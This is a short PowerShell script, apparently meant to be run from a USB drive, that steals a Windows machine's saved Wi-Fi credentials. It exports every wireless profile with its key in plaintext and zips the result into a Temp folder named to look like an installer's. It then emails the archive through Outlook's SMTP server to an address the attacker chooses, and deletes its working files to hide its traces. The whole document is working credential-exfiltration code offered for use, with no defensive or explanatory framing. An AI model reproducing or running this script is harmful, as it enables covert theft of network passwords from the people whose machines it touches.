$email = 'insert your email here'
$password = 'insert your password here'
$send_to = 'email to send to'
$name = $env:COMPUTERNAME
$date = Get-Date
$usb = (Get-Volume -FileSystemLabel 999).DriveLetter + ":"
$user = $env:UserName
cd ~\Documents
mkdir wifi
cd wifi
netsh wlan export profile key=clear
cd ..
Compress-Archive -Path wifi -DestinationPath ~\AppData\Local\Temp\IXP000.TMP\wifi.zip
$SMTPServer = 'smtp-mail.outlook.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($email, $password)
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = $email
$ReportEmail.To.Add($send_to)
$ReportEmail.Subject = "WiFi / $name - $user"
$ReportEmail.Body = "$date"
$ReportEmail.Attachments.Add("wifi.zip")
$SMTPInfo.Send($ReportEmail)
cd ~/Documents
del wifi\*
rmdir wifi
